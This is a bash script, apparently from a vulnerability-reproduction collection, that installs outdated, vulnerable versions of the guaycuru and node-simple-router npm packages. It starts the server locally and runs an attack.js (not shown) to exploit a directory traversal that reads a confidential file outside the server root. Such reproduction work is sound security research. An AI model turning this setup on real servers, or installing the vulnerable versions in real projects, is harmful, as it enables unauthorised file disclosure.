#!/bin/bash
# author: Liang Gong

if [ "$(uname)" == "Darwin" ]; then
    # under Mac OS X platform
    NODE='node'       
elif [ "$(expr substr $(uname -s) 1 5)" == "Linux" ]; then
    # under GNU/Linux platform
    NODE='nodejs'
fi

#  It turns out that guaycuru uses another package called node-simple-router (created by the same author).
# The directory traversal issue was also fixed in node-simple-router (fix link: https://github.com/sandy98/node-simple-router/commit/dfdd52e2e80607af433097d940b3834fd96df488).
# The guaycuru package now dependents on node-simple-router@latest

# To reproduce exactly what happened before the vulnerability was fixed, 
# please use the following commands:

npm uninstall node-simple-router
npm uninstall node_modules/guaycuru
npm cache clear
npm install guaycuru@0.2.3
cd node_modules/guaycuru/
npm uninstall node-simple-router
npm install node-simple-router@0.10.0
cd ../..

cd directory-traversal/guaycuru

RED='\033[0;31m'
BLUE='\033[0;34m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

# start the server
echo -e "\t[${GREEN}start vulnerable server${NC}]: ${BLUE}guaycuru${NC}"
$NODE test.js -p 8080 >/dev/null 2>&1  &
vulnpid=$!

# wait for the server to get started
sleep 1.5s

echo -e "\t[${GREEN}server root directory${NC}]: `pwd`"

# utilize directory traversal to get files outside the working directory
# trigger directory traversal issues: send a request to retrieve the confidential file outside the working directory
$NODE attack.js

# kill the vulnerable npm package's process
kill -9 $vulnpid